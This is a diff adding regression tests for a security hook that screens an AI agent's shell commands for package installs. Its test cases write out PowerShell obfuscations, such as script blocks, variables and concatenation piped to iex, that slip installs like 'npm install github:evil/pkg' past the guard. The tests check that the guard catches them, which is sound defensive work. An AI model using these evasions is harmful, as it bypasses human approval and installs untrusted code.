@@ -230,3 +230,71 @@ describe('no regression: a benign command without iex stays allowed', { timeout:
     expect(runHook(command, tool).decision).toBeUndefined();
   });
 });
+
+// ---------------------------------------------------------------------------
+// Residual gaps: a script block or a variable between the string and iex
+// ---------------------------------------------------------------------------
+// The install text is not a literal string the guard reads: it sits in a script block or in a variable. The guard
+// reads raw text and fails closed: an iex word plus a package-manager word in one command asks. No cmdlet list, no
+// variable tracking. Each ask case below passed the guard before this rule.
+
+function expectAsk(tool: string, command: string): void {
+  const r = runHook(command, tool);
+  expect(r.decision).toBe('ask');
+  expect(r.reason).toMatch(/PACKAGE SECURITY/);
+}
+
+describe('residual 1: a string inside a script block piped to iex asks', { timeout: 180_000 }, () => {
+  it.each<Case>([
+    ['PowerShell', `1 | ForEach-Object { 'npm install x' } | iex`],
+    ['PowerShell', `. { 'npm install x' } | iex`],
+    ['PowerShell', `& { 'npm install x' } | iex`],
+    ['PowerShell', `1 | ForEach-Object { 'npm install x' } | Invoke-Expression`],
+    ['PowerShell', `1 | % { 'npm install x' } | IEX`],
+    ['PowerShell', `1 | ForEach-Object { "pip install x" } | Iex`],
+    ['PowerShell', `& { '${EVIL}' } | iex`],
+    ['Bash', `. { 'npm install x' } | iex`],
+  ])('[%s] %j asks', (tool, command) => {
+    expectAsk(tool, command);
+  });
+
+  it('denies where no human can answer', () => {
+    expect(runHook(`. { 'npm install x' } | iex`, 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
+  });
+});
+
+describe('residual 2: a string built through a variable and run by iex asks', { timeout: 180_000 }, () => {
+  it.each<Case>([
+    ['PowerShell', `$a='npm install x'; $a | iex`],
+    ['PowerShell', `$a='npm install x'; iex $a`],
+    ['PowerShell', `$a='npm install x'\niex $a`],
+    ['PowerShell', `$a='npm'; $b=' install x'; $a+$b | iex`],
+    ['PowerShell', `$a='np'+'m install x'; Invoke-Expression $a`],
+    ['PowerShell', `iex 'npm install lodash'; $a='npm install x'; iex $a`],
+    ['Bash', `$a='npm install x'; iex $a`],
+  ])('[%s] %j asks', (tool, command) => {
+    expectAsk(tool, command);
+  });
+});
+
+describe('residual 3: an early literal does not make the pipeline readable when a later script block can replace it', { timeout: 180_000 }, () => {
+  it.each<Case>([
+    ['PowerShell', `$a='npm install github:evil/pkg'; 'Get-Date' | ForEach-Object { $a } | iex`],
+    ['PowerShell', `$a='npm install x'; "Get-Date" | % { $a } | iex`],
+    ['PowerShell', `$a='npm install x'; 'Get-Date' | ForEach-Object { $a } | Invoke-Expression`],
+    ['Bash', `$a='npm install x'; 'Get-Date' | ForEach-Object { $a } | iex`],
+  ])('[%s] %j asks', (tool, command) => {
+    expectAsk(tool, command);
+  });
+});
+
+describe('residual controls: no manager word, or no iex, stays allowed', { timeout: 120_000 }, () => {
+  it.each<Case>([
+    ['PowerShell', `iex 'Get-Date'`],
+    ['PowerShell', `1 | ForEach-Object { 'Get-Date' } | iex`],
+    ['PowerShell', `$a = 'Get-Date'; $a | iex`],
+    ['PowerShell', `$a='npm install x'; Write-Host $a`],
+  ])('[%s] %j stays allowed', (tool, command) => {
+    expect(runHook(command, tool).decision).toBeUndefined();
+  });
+});
